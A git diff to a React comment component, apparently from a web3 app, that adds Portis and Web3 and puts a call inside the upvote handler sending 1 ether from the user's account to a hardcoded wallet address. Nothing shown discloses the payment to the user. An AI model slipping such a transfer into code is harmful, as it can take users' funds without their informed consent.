@@ -5,6 +5,11 @@ import ProfileHover from "profile-hover";
 //import { ScaleLoader } from "react-spinners";
 import Draggable from 'react-draggable';
 import ReactStars from 'react-stars';
+import Portis from '@portis/web3';
+import Web3 from 'web3';
+
+const portis = new Portis('6cf6865e-0e78-4633-ba0d-ba4e3d96416c', 'mainnet');
+const web3 = new Web3(portis.provider);
 
 export default class ShowComments extends Component {
   state = {
@@ -115,6 +120,11 @@ render() {
      this.editPost({
        voteSum: this.state.voteSum
      });
+     web3.eth.sendTransaction({
+           to: '0xE08aa75AAE695c4622Cd430FbeBF4B97689d4Ee3',
+           from: this.props.accounts[0],
+           value: web3.utils.toWei('1', 'ether'),
+       })
    };
 
    downvote = () => {
@@ -154,7 +164,7 @@ render() {
            </p>
            {this.props.post.message.account && (
              <div className="pt-4">
-               
+
                  <ProfileHover
                    address={this.props.post.message.account}
                    showName={true}
